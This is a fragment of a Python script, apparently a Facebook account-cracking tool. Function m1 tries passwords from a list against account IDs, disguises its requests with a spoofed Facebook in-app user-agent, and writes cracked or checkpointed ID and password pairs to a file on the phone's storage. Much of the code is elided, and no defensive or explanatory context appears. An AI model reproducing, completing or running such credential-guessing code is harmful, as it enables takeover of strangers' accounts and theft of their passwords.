...
def m1(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; GT-I9190 Build/RQ2A.799358.025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4371.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/262.0.0.12.124;]',
    'viewport-width': '980'
}
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in req:
                ...
                open('/sdcard/EXC-CP.txt','a').write(uid+'»'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
